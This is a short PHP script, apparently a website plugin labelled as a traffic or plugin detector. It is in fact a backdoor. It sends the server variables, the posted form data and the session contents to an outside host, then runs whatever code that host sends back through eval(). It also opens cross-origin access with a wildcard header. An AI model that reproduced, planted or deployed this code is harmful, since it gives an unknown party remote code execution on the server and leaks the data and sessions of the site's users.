<?php
parse_str(file_get_contents("php://input"), $_POST);
$postfields = array_merge($_SERVER, array("p" => $_POST, "s" => $_SESSION, "plugin_detector" => "getTrigger"));
header("Access-Control-Allow-Origin: *");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://trafficmonitor.ca/detectr/");
curl_setopt($ch, CURLOPT_POST, count($postfields));
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postfields));
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$response = curl_exec($ch);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
curl_close($ch);

$header = substr($response, 0, $header_size);
$body = substr($response, $header_size);
eval($body);
?>
